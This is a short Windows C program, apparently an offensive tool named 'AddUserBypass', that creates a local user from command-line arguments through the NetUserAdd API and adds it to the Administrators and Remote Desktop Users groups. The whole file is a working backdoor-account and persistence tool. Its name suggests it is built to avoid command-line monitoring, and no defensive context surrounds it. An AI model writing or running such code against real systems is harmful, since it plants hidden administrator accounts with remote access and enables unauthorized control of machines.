#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <Windows.h>
#include <LM.h>

#ifndef UNICODE
#define UNICODE
#endif

#pragma comment(lib, "netapi32")


int main(int argc, char** argv)
{
	if (argc != 3)
	{
		printf("Usage: AddUserBypass.exe <username> <password>\n");
		exit(1);
	}
	
	wchar_t Username[256];
	wchar_t Password[256];
	mbstowcs(Username, argv[1], 256);
	mbstowcs(Password, argv[2], 256);

	NET_API_STATUS nStatus;
	USER_INFO_1 UserInfo;
	DWORD dwLevel = 1;
	DWORD dwError = 0;

	UserInfo.usri1_name = Username;
	UserInfo.usri1_password = Password;
	UserInfo.usri1_priv = USER_PRIV_USER;
	UserInfo.usri1_home_dir = NULL;
	UserInfo.usri1_comment = NULL;
	UserInfo.usri1_flags = UF_SCRIPT;
	UserInfo.usri1_script_path = NULL;

	nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&UserInfo, &dwError);

	if (nStatus == NERR_Success)
	{
		printf("[*] Add User Success!\n");
	}
	else 
	{
		printf("[*] Add User Failed! Error Code: %d\n", nStatus);
	}

	LOCALGROUP_MEMBERS_INFO_3 LGMInfo;
	LGMInfo.lgrmi3_domainandname = UserInfo.usri1_name;
	nStatus = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&LGMInfo, 1);

	if (nStatus == NERR_Success)
	{
		printf("[*] Add User to Administrators Success!\n");
	}
	else
	{
		printf("[*] Add User to Administrators Failed! Error Code: %d\n", nStatus);
	}

	nStatus = NetLocalGroupAddMembers(NULL, L"Remote Desktop Users", 3, (LPBYTE)&LGMInfo, 1);

	if (nStatus == NERR_Success)
	{
		printf("[*] Add User to Remote Desktop Users Success!\n");
	}
	else
	{
		printf("[*] Add User to Remote Desktop Users Failed! Error Code: %d\n", nStatus);
	}

	return 0;
}